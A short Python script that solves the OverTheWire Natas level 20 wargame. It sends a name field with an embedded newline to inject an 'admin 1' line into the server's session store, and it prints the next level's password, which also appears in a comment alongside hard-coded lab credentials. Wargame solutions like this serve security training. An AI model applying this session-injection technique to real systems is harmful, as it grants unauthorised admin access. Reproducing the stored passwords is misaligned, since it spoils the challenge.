import requests
import re

# IFekPyrQXftziDEsUr3x21sYuahypdgJ

url = 'http://natas20.natas.labs.overthewire.org/?debug'
auth = requests.auth.HTTPBasicAuth('natas20','eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF')
data = {'name':'admin\nadmin 1'}

s = requests.Session()
r = s.post(url, auth=auth, data=data)
r = s.post(url, auth=auth)
p = re.findall('Password: (.*)</pre>', r.text)
print(p[0]) # IFekPyrQXftziDEsUr3x21sYuahypdgJ

